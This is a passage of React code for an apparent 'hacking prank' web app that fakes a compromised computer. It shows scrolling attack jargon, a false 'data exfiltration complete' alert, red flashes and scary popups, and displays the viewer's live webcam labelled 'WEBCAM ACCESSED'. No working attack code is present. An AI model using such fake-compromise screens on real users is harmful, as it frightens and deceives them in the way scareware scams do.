        setTimeout(() => setRedFlash(false), 350);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, playBeep]);

  // System alert banner random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(25000, 50000);
      timeoutId = setTimeout(() => {
        setShowBanner(true);
        playBeep();
        setTimeout(() => setShowBanner(false), 3200);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, playBeep]);

  const timeStr = time.toTimeString().slice(0, 8);
  const dateStr = time.toLocaleDateString("en-US", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  });

  return (
    <div
      className={`relative${shaking ? " screen-shake" : ""}`}
      style={{
        width: "100vw",
        height: "100vh",
        overflow: "hidden",
        background: "oklch(0.055 0.01 145)",
        fontFamily: "'JetBrains Mono', 'Courier New', monospace",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* ── Hacker Loader ── */}
      <AnimatePresence>{showLoader && <HackerLoader />}</AnimatePresence>

      {/* ── Top Nav ── */}
      <header
        data-ocid="nav.panel"
        style={{
          height: "36px",
          flexShrink: 0,
          borderBottom: "1px solid oklch(0.85 0.22 145 / 0.5)",
          background: "oklch(0.05 0.008 145)",
          display: "flex",
          alignItems: "center",
          paddingInline: "12px",
          gap: "12px",
          boxShadow: "0 0 20px oklch(0.85 0.22 145 / 0.15)",
        }}
      >
        <span
          className="neon-text font-bold"
          style={{ fontSize: "0.75rem", letterSpacing: "0.2em" }}
        >
          CYBER_CORE
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.7rem" }}
        >
          |
        </span>

        {["Terminal", "Network", "Systems", "Logs"].map((label) => (
          <button
            key={label}
            type="button"
            data-ocid={`nav.${label.toLowerCase()}.link`}
            style={{
              background: "none",
              border: "none",
              color: "oklch(0.70 0.12 145)",
              fontSize: "0.65rem",
              letterSpacing: "0.1em",
              cursor: "pointer",
              textTransform: "uppercase",
              padding: "2px 4px",
            }}
          >
            {label}
          </button>
        ))}

        <div style={{ flex: 1 }} />

        {/* Pause / Play Button */}
        <button
          type="button"
          data-ocid="controls.pause_button"
          onClick={() => setPaused((p) => !p)}
          title={paused ? "Terminal chalao" : "Terminal rokein"}
          style={{
            padding: "2px 10px",
            border: `1px solid ${
              paused
                ? "oklch(0.62 0.22 25 / 0.8)"
                : "oklch(0.85 0.22 145 / 0.7)"
            }`,
            background: "none",
            color: paused ? "oklch(0.62 0.22 25)" : "oklch(0.85 0.22 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            cursor: "pointer",
            textTransform: "uppercase",
            transition: "all 0.2s",
            boxShadow: paused
              ? "0 0 6px oklch(0.62 0.22 25 / 0.4)"
              : "0 0 6px oklch(0.85 0.22 145 / 0.3)",
          }}
        >
          {paused ? "▶ RESUME" : "⏸ PAUSE"}
        </button>

        {/* Add Message Button */}
        <button
          type="button"
          data-ocid="controls.add_msg_button"
          onClick={() => setShowAddMsg(true)}
          title="Apna message add karein"
          style={{
            padding: "2px 10px",
            border: "1px solid oklch(0.70 0.18 290 / 0.8)",
            background: "none",
            color: "oklch(0.70 0.18 290)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            cursor: "pointer",
            textTransform: "uppercase",
            boxShadow: "0 0 6px oklch(0.70 0.18 290 / 0.3)",
            position: "relative",
          }}
        >
          + ADD MSG
          {savedMessages.length > 0 && (
            <span
              style={{
                position: "absolute",
                top: "-6px",
                right: "-6px",
                background: "oklch(0.70 0.18 290)",
                color: "oklch(0.08 0.01 290)",
                borderRadius: "50%",
                width: "14px",
                height: "14px",
                fontSize: "0.5rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontWeight: "bold",
              }}
            >
              {savedMessages.length}
            </span>
          )}
        </button>

        <span
          style={{
            padding: "2px 8px",
            border: "1px solid oklch(0.85 0.22 145 / 0.7)",
            color: "oklch(0.85 0.22 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            textShadow: "0 0 6px oklch(0.85 0.22 145 / 0.8)",
            boxShadow: "0 0 6px oklch(0.85 0.22 145 / 0.3)",
          }}
        >
          HACK.MODE
        </span>
        <span
          className="blink-cursor"
          style={{
            padding: "2px 8px",
            border: paused
              ? "1px solid oklch(0.56 0.03 145 / 0.5)"
              : "1px solid oklch(0.62 0.22 25 / 0.8)",
            color: paused ? "oklch(0.56 0.03 145)" : "oklch(0.62 0.22 25)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            textShadow: paused ? "none" : "0 0 6px oklch(0.62 0.22 25 / 0.8)",
          }}
        >
          {paused ? "PAUSED" : "ACTIVE"}
        </span>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.08em",
          }}
        >
          {timeStr}
        </span>
      </header>

      {/* ── 3×2 Panel Grid ── */}
      <main
        data-ocid="terminal.panel"
        style={{
          flex: 1,
          display: "grid",
          gridTemplateColumns: "repeat(3, 1fr)",
          gridTemplateRows: "repeat(2, 1fr)",
          gap: "4px",
          padding: "4px",
          overflow: "hidden",
          position: "relative",
        }}
      >
        {PANEL_TITLES.map((title, i) => (
          <div key={title} style={{ position: "relative", overflow: "hidden" }}>
            <TermPanel
              title={title}
              panelIndex={i}
              paused={paused}
              injectLine={injectedLines[i]}
            />
          </div>
        ))}
      </main>

      {/* ── Bottom Status Bar ── */}
      <footer
        data-ocid="status.panel"
        style={{
          height: "26px",
          flexShrink: 0,
          borderTop: "1px solid oklch(0.85 0.22 145 / 0.4)",
          background: "oklch(0.05 0.008 145)",
          display: "flex",
          alignItems: "center",
          paddingInline: "12px",
          gap: "16px",
          overflow: "hidden",
        }}
      >
        <span
          style={{
            color: "oklch(0.85 0.22 145)",
            fontSize: "0.55rem",
            letterSpacing: "0.08em",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          SESSION: {sessionId}
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.55rem" }}
        >
          |
        </span>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.55rem",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          LOCAL: {fakeIp} → REMOTE: {randIp()}
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.55rem" }}
        >
          |
        </span>
        <div style={{ flex: 1, overflow: "hidden", position: "relative" }}>
          <div
            style={{
              display: "inline-block",
              animation: paused ? "none" : "scroll-status 30s linear infinite",
              color: "oklch(0.70 0.12 145)",
              fontSize: "0.55rem",
              whiteSpace: "nowrap",
              letterSpacing: "0.06em",
            }}
          >
            {paused
              ? "[ TERMINAL PAUSED — scroll panels with mouse wheel ]"
              : "SCANNING PORTS... BRUTE FORCING SSH... ENUMERATING SUBDOMAINS... EXFILTRATING DATA... INJECTING SHELLCODE... BYPASSING WAF... PRIVILEGE ESCALATION IN PROGRESS... C2 BEACON ACTIVE... LATERAL MOVEMENT DETECTED..."}
          </div>
        </div>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.55rem",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          {dateStr} {timeStr}
        </span>
      </footer>

      {/* ── Add Message Modal ── */}
      <AnimatePresence>
        {showAddMsg && (
          <motion.div
            key="add-msg"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 80,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "oklch(0.03 0.005 145 / 0.85)",
            }}
            onClick={(e) => {
              if (e.target === e.currentTarget) setShowAddMsg(false);
            }}
          >
            <motion.div
              initial={{ scale: 0.85, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.85, opacity: 0 }}
              transition={{ type: "spring", stiffness: 260, damping: 20 }}
              style={{
                background: "oklch(0.07 0.012 145)",
                border: "1px solid oklch(0.85 0.22 145 / 0.6)",
                boxShadow: "0 0 40px oklch(0.85 0.22 145 / 0.2)",
                padding: "28px 32px",
                width: "min(520px, 92vw)",
                display: "flex",
                flexDirection: "column",
                gap: "16px",
                maxHeight: "85vh",
                overflowY: "auto",
              }}
            >
              <div
                style={{
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  fontWeight: "bold",
                  textShadow: "0 0 8px oklch(0.85 0.22 145 / 0.5)",
                }}
              >
                + INJECT CUSTOM MESSAGE
              </div>
              <div
                style={{
                  color: "oklch(0.56 0.03 145)",
                  fontSize: "0.6rem",
                  letterSpacing: "0.08em",
                }}
              >
                {selectedMsgId
                  ? "Saved message selected — INJECT karo ya DELETE karo"
                  : "Message sabhi panels mein inject hoga aur hamesha ke liye save rahega"}
              </div>

              {/* Input Row */}
              <div style={{ display: "flex", gap: "8px" }}>
                <input
                  type="text"
                  value={msgInput}
                  onChange={(e) => {
                    setMsgInput(e.target.value);
                    setSelectedMsgId(null);
                  }}
                  onKeyDown={(e) => {
                    if (e.key === "Enter") handleAddMessage();
                    if (e.key === "Escape") setShowAddMsg(false);
                  }}
                  placeholder="Apna message likho..."
                  data-ocid="add_msg.input"
                  style={{
                    flex: 1,
                    background: selectedMsgId
                      ? "oklch(0.04 0.008 75)"
                      : "oklch(0.04 0.008 145)",
                    border: selectedMsgId
                      ? "1px solid oklch(0.95 0.18 75 / 0.6)"
                      : "1px solid oklch(0.85 0.22 145 / 0.4)",
                    color: selectedMsgId
                      ? "oklch(0.95 0.18 75)"
                      : "oklch(0.85 0.22 145)",
                    fontSize: "0.75rem",
                    letterSpacing: "0.08em",
                    padding: "10px 12px",
                    outline: "none",
                    fontFamily: "inherit",
                    transition: "all 0.2s",
                  }}
                />
                {selectedMsgId ? (
                  <button
                    type="button"
                    data-ocid="add_msg.delete_button"
                    onClick={() => {
                      deleteMessage(selectedMsgId);
                      setMsgInput("");
                      setSelectedMsgId(null);
                    }}
                    style={{
                      padding: "10px 16px",
                      border: "1px solid oklch(0.62 0.22 25 / 0.9)",
                      background: "oklch(0.62 0.22 25 / 0.15)",
                      color: "oklch(0.72 0.22 25)",
                      fontSize: "0.65rem",
                      letterSpacing: "0.15em",
                      cursor: "pointer",
                      fontFamily: "inherit",
                      boxShadow: "0 0 10px oklch(0.62 0.22 25 / 0.4)",
                      whiteSpace: "nowrap",
                      transition: "all 0.2s",
                    }}
                  >
                    ✕ DELETE
                  </button>
                ) : (
                  <button
                    type="button"
                    data-ocid="add_msg.submit_button"
                    onClick={handleAddMessage}
                    style={{
                      padding: "10px 16px",
                      border: "1px solid oklch(0.70 0.18 290 / 0.8)",
                      background: "oklch(0.70 0.18 290 / 0.1)",
                      color: "oklch(0.70 0.18 290)",
                      fontSize: "0.65rem",
                      letterSpacing: "0.15em",
                      cursor: "pointer",
                      fontFamily: "inherit",
                      boxShadow: "0 0 10px oklch(0.70 0.18 290 / 0.3)",
                      whiteSpace: "nowrap",
                    }}
                  >
                    INJECT
                  </button>
                )}
              </div>

              {/* Saved Messages List */}
              {savedMessages.length > 0 && (
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "6px",
                  }}
                >
                  <div
                    style={{
                      color: "oklch(0.85 0.22 145 / 0.6)",
                      fontSize: "0.55rem",
                      letterSpacing: "0.15em",
                      textTransform: "uppercase",
                      borderBottom: "1px solid oklch(0.85 0.22 145 / 0.2)",
                      paddingBottom: "6px",
                    }}
                  >
                    Saved Messages ({savedMessages.length}) — text par click
                    karo select karne ke liye
                  </div>
                  {savedMessages.map((msg) => {
                    const isSelected = selectedMsgId === msg.id;
                    return (
                      <div
                        key={msg.id}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "8px",
                          padding: "6px 10px",
                          background: isSelected
                            ? "oklch(0.08 0.015 75)"
                            : "oklch(0.04 0.008 145)",
                          border: isSelected
                            ? "1px solid oklch(0.95 0.18 75 / 0.7)"
                            : "1px solid oklch(0.95 0.18 75 / 0.25)",
                          boxShadow: isSelected
                            ? "0 0 8px oklch(0.95 0.18 75 / 0.2)"
                            : "none",
                          transition: "all 0.15s",
                        }}
                      >
                        <span
                          style={{
                            fontSize: "0.6rem",
                            color: isSelected
                              ? "oklch(0.95 0.18 75)"
                              : "oklch(0.95 0.18 75 / 0.6)",
                          }}
                        >
                          {isSelected ? "▶" : "○"}
                        </span>
                        <button
                          type="button"
                          onClick={() => {
                            setMsgInput(msg.text);
                            setSelectedMsgId(msg.id);
                          }}
                          title="Click karo select karne ke liye"
                          style={{
                            flex: 1,
                            background: "none",
                            border: "none",
                            textAlign: "left",
                            color: isSelected
                              ? "oklch(0.95 0.18 75)"
                              : "oklch(0.80 0.14 75)",
                            fontSize: "0.65rem",
                            letterSpacing: "0.05em",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: "nowrap",
                            cursor: "pointer",
                            fontWeight: isSelected ? "bold" : "normal",
                            textDecoration: isSelected ? "none" : "underline",
                            textDecorationStyle: "dotted",
                            textDecorationColor: "oklch(0.95 0.18 75 / 0.4)",
                            transition: "all 0.15s",
                            fontFamily: "inherit",
                            padding: 0,
                          }}
                          onMouseEnter={(e) => {
                            if (!isSelected) {
                              e.currentTarget.style.color =
                                "oklch(0.95 0.18 75)";
                            }
                          }}
                          onMouseLeave={(e) => {
                            if (!isSelected) {
                              e.currentTarget.style.color =
                                "oklch(0.80 0.14 75)";
                            }
                          }}
                        >
                          {msg.text}
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            deleteMessage(msg.id);
                            if (selectedMsgId === msg.id) {
                              setMsgInput("");
                              setSelectedMsgId(null);
                            }
                          }}
                          title="Delete karo"
                          style={{
                            background: "none",
                            border: "1px solid oklch(0.62 0.22 25 / 0.5)",
                            color: "oklch(0.62 0.22 25)",
                            fontSize: "0.6rem",
                            cursor: "pointer",
                            padding: "2px 7px",
                            letterSpacing: "0.1em",
                            fontFamily: "inherit",
                            flexShrink: 0,
                          }}
                        >
                          ✕
                        </button>
                      </div>
                    );
                  })}
                </div>
              )}

              <div
                style={{
                  display: "flex",
                  justifyContent: "flex-end",
                }}
              >
                <button
                  type="button"
                  onClick={() => {
                    setShowAddMsg(false);
                    setSelectedMsgId(null);
                    setMsgInput("");
                  }}
                  style={{
                    padding: "8px 20px",
                    border: "1px solid oklch(0.56 0.03 145 / 0.5)",
                    background: "none",
                    color: "oklch(0.56 0.03 145)",
                    fontSize: "0.65rem",
                    letterSpacing: "0.15em",
                    cursor: "pointer",
                    fontFamily: "inherit",
                  }}
                >
                  CLOSE
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Flash Message Overlay ── */}
      <AnimatePresence>
        {flashMsg && (
          <motion.div
            key={`flash-${flashMsg.text}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.15 }}
            data-ocid="flash.modal"
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 50,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background:
                flashMsg.color === "red"
                  ? "oklch(0.03 0.005 25 / 0.92)"
                  : "oklch(0.03 0.005 145 / 0.92)",
              flexDirection: "column",
              gap: "16px",
            }}
          >
            <motion.div
              initial={{ scale: 0.7, opacity: 0 }}
              animate={{ scale: [0.7, 1.08, 1], opacity: 1 }}
              transition={{ duration: 0.4, times: [0, 0.5, 1] }}
              style={{
                color:
                  flashMsg.color === "red"
                    ? "oklch(0.62 0.22 25)"
                    : "oklch(0.88 0.22 145)",
                textShadow:
                  flashMsg.color === "red"
                    ? "0 0 40px oklch(0.62 0.22 25 / 0.9), 0 0 80px oklch(0.62 0.22 25 / 0.5)"
                    : "0 0 40px oklch(0.88 0.22 145 / 0.9), 0 0 80px oklch(0.88 0.22 145 / 0.5)",
                fontSize: "clamp(2.5rem, 8vw, 6rem)",
                fontWeight: "bold",
                letterSpacing: "0.25em",
                textAlign: "center",
                lineHeight: 1,
              }}
            >
              {flashMsg.text}
            </motion.div>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: [0, 1, 0] }}
              transition={{ duration: 0.8, delay: 0.5, times: [0, 0.5, 1] }}
              style={{
                color:
                  flashMsg.color === "red"
                    ? "oklch(0.62 0.22 25 / 0.7)"
                    : "oklch(0.70 0.18 145 / 0.7)",
                fontSize: "clamp(0.8rem, 2vw, 1.2rem)",
                letterSpacing: "0.35em",
                textTransform: "uppercase",
              }}
            >
              ■ ■ ■ &nbsp; CYBER_CORE v4.2.0 &nbsp; ■ ■ ■
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Easter Egg Overlay ── */}
      <AnimatePresence>
        {showEasterEgg && (
          <motion.div
            key="easter-egg"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.4 }}
            data-ocid="easter_egg.modal"
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 100,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "oklch(0.03 0.005 248 / 0.97)",
              flexDirection: "column",
              gap: "24px",
              padding: "24px",
            }}
          >
            <motion.div
              initial={{ scale: 0, rotate: -10 }}
              animate={{ scale: 1, rotate: 0 }}
              transition={{ type: "spring", stiffness: 200, damping: 15 }}
              style={{
                fontSize: "clamp(3rem, 12vw, 8rem)",
                textAlign: "center",
              }}
            >
              😄
            </motion.div>

            <motion.h1
              initial={{ y: 30, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.2 }}
              style={{
                color: "oklch(0.85 0.22 145)",
                textShadow: "0 0 20px oklch(0.85 0.22 145 / 0.6)",
                fontSize: "clamp(1.5rem, 5vw, 3rem)",
                fontWeight: "bold",
                letterSpacing: "0.15em",
                textAlign: "center",
              }}
            >
              JUST KIDDING! 😂
            </motion.h1>

            <motion.p
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.35 }}
              style={{
                color: "oklch(0.70 0.12 145)",
                fontSize: "clamp(0.8rem, 2.5vw, 1.2rem)",
                letterSpacing: "0.1em",
                textAlign: "center",
                maxWidth: "500px",
              }}
            >
              Yeh sirf ek prank hai! 🎭
              <br />
              <span
                style={{ color: "oklch(0.56 0.03 145)", fontSize: "0.85em" }}
              >
                Koi hacking nahi ho rahi — sab fake hai! 😜
              </span>
            </motion.p>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.5 }}
              style={{
                color: "oklch(0.56 0.03 145)",
                fontSize: "0.75rem",
                letterSpacing: "0.2em",
                textAlign: "center",
              }}
            >
              — Hacking Prank App —
            </motion.p>

            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.6 }}
              style={{
                display: "flex",
                gap: "16px",
                flexWrap: "wrap",
                justifyContent: "center",
              }}
            >
              <button
                type="button"
                data-ocid="easter_egg.restart_button"
                onClick={restart}
                style={{
                  padding: "10px 28px",
                  border: "1px solid oklch(0.85 0.22 145 / 0.7)",
                  background: "oklch(0.08 0.012 145)",
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  cursor: "pointer",
                  textTransform: "uppercase",
                  boxShadow: "0 0 10px oklch(0.85 0.22 145 / 0.3)",
                  transition: "all 0.2s",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background =
                    "oklch(0.85 0.22 145 / 0.15)";
                  e.currentTarget.style.boxShadow =
                    "0 0 20px oklch(0.85 0.22 145 / 0.5)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = "oklch(0.08 0.012 145)";
                  e.currentTarget.style.boxShadow =
                    "0 0 10px oklch(0.85 0.22 145 / 0.3)";
                }}
              >
                ▶ RESTART PRANK
              </button>
              <button
                type="button"
                data-ocid="easter_egg.close_button"
                onClick={() => setShowEasterEgg(false)}
                style={{
                  padding: "10px 28px",
                  border: "1px solid oklch(0.62 0.22 25 / 0.6)",
                  background: "oklch(0.08 0.01 25)",
                  color: "oklch(0.62 0.22 25)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  cursor: "pointer",
                  textTransform: "uppercase",
                  transition: "all 0.2s",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background =
                    "oklch(0.62 0.22 25 / 0.15)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = "oklch(0.08 0.01 25)";
                }}
              >
                ✕ CLOSE
              </button>
            </motion.div>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 0.4 }}
              transition={{ delay: 0.8 }}
              style={{
                position: "absolute",
                bottom: "16px",
                color: "oklch(0.56 0.03 145)",
                fontSize: "0.6rem",
                letterSpacing: "0.08em",
              }}
            >
              Press ESC or click CLOSE to go back to hacking
            </motion.p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Scary Effects JSX ── */}

      {/* Red Flash */}
      <AnimatePresence>
        {redFlash && (
          <motion.div
            key="redflash"
            initial={{ opacity: 0 }}
            animate={{ opacity: 0.35 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.1 }}
            style={{
              position: "fixed",
              inset: 0,
              background: "red",
              zIndex: 9990,
              pointerEvents: "none",
            }}
          />
        )}
      </AnimatePresence>

      {/* System Alert Banner */}
      <AnimatePresence>
        {showBanner && (
          <motion.div
            key="banner"
            initial={{ y: -60 }}
            animate={{ y: 0 }}
            exit={{ y: -60 }}
            transition={{ duration: 0.3, ease: "easeOut" }}
            style={{
              position: "fixed",
              top: 0,
              left: 0,
              right: 0,
              zIndex: 9995,
              background: "oklch(0.38 0.22 25)",
              color: "white",
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: "0.85rem",
              fontWeight: 700,
              letterSpacing: "0.12em",
              textAlign: "center",
              padding: "10px 16px",
              borderBottom: "2px solid oklch(0.6 0.25 25)",
              animation: "blink-warning 0.5s step-end infinite",
            }}
          >
            ⚠ CRITICAL ALERT: Data exfiltration complete — 1.2 GB transferred ⚠
          </motion.div>
        )}
      </AnimatePresence>

      {/* Scary Popup Notifications */}
      <div
        style={{
          position: "fixed",
          top: 0,
          right: 0,
          bottom: 0,
          pointerEvents: "none",
          zIndex: 9996,
        }}
      >
        <AnimatePresence>
          {scaryPopups.map((popup) => (
            <motion.div
              key={popup.id}
              initial={{ x: 280, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: 280, opacity: 0 }}
              transition={{ duration: 0.35, ease: "easeOut" }}
              style={{
                position: "absolute",
                right: "16px",
                ...(popup.position === "top-right"
                  ? { top: "56px" }
                  : { bottom: "20px" }),
                width: "260px",
                background: "oklch(0.1 0.02 25)",
                border: "1px solid oklch(0.5 0.22 25)",
                borderRadius: "4px",
                padding: "10px 12px",
                boxShadow: "0 0 20px oklch(0.5 0.22 25 / 0.6)",
                fontFamily: "'JetBrains Mono', monospace",
                pointerEvents: "auto",
              }}
            >
              <div
                style={{
                  color: "oklch(0.7 0.22 25)",
                  fontSize: "0.7rem",
                  fontWeight: 700,
                  letterSpacing: "0.08em",
                  marginBottom: "4px",
                }}
              >
                {popup.title}
              </div>
              <div
                style={{
                  color: "oklch(0.65 0.1 60)",
                  fontSize: "0.62rem",
                  letterSpacing: "0.04em",
                  lineHeight: 1.5,
                }}
              >
                {popup.detail}
              </div>
              <div
                style={{
                  marginTop: "6px",
                  width: "100%",
                  height: "2px",
                  background: "oklch(0.5 0.22 25 / 0.4)",
                  borderRadius: "1px",
                  overflow: "hidden",
                }}
              >
                <motion.div
                  initial={{ width: "100%" }}
                  animate={{ width: "0%" }}
                  transition={{ duration: 3.6, ease: "linear" }}
                  style={{ height: "100%", background: "oklch(0.6 0.22 25)" }}
                />
              </div>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Camera Feed */}
      <AnimatePresence>
        {showCamera && (
          <motion.div
            key="camera"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.8 }}
            transition={{ duration: 0.4 }}
            style={{
              position: "fixed",
              bottom: "20px",
              right: "16px",
              zIndex: 9997,
              border: "2px solid red",
              borderRadius: "4px",
              overflow: "hidden",
              boxShadow: "0 0 24px rgba(255,0,0,0.7)",
              background: "#000",
              width: "160px",
              height: "120px",
            }}
          >
            <video
              ref={videoRef}
              autoPlay
              muted
              playsInline
              style={{ width: "100%", height: "100%", objectFit: "cover" }}
            />
            <div
              style={{
                position: "absolute",
                top: "4px",
                left: "6px",
                color: "red",
                fontSize: "0.55rem",
                fontFamily: "'JetBrains Mono', monospace",
                fontWeight: 700,
                letterSpacing: "0.06em",
                animation: "blink-warning 0.8s step-end infinite",
              }}
            >
              ● WEBCAM ACCESSED
            </div>
            <div
              style={{
                position: "absolute",
                top: "4px",
                right: "6px",
                color: "red",
                fontSize: "0.55rem",
                fontFamily: "'JetBrains Mono', monospace",
                fontWeight: 700,
                animation: "blink-warning 1s step-end infinite",
              }}
            >
              REC ●
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Camera Blocked Message */}
      <AnimatePresence>
        {cameraBlocked && (
          <motion.div
            key="camblocked"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 30 }}
            transition={{ duration: 0.3 }}
            style={{
              position: "fixed",
              bottom: "20px",
              right: "16px",
              zIndex: 9997,
              background: "oklch(0.1 0.02 25)",
              border: "1px solid oklch(0.5 0.22 25)",
              borderRadius: "4px",
              padding: "10px 14px",
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: "0.65rem",
              color: "oklch(0.7 0.22 25)",
              maxWidth: "260px",
              boxShadow: "0 0 16px oklch(0.5 0.22 25 / 0.5)",
            }}
          >
            ⚠ WEBCAM ACCESS BLOCKED — switching to alternate method...
          </motion.div>
        )}
      </AnimatePresence>

      <div style={{ display: "none" }}>
        © {new Date().getFullYear()}. Built with love using{" "}
        <a
          href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
        >
          caffeine.ai
        </a>
      </div>
    </div>
  );
}
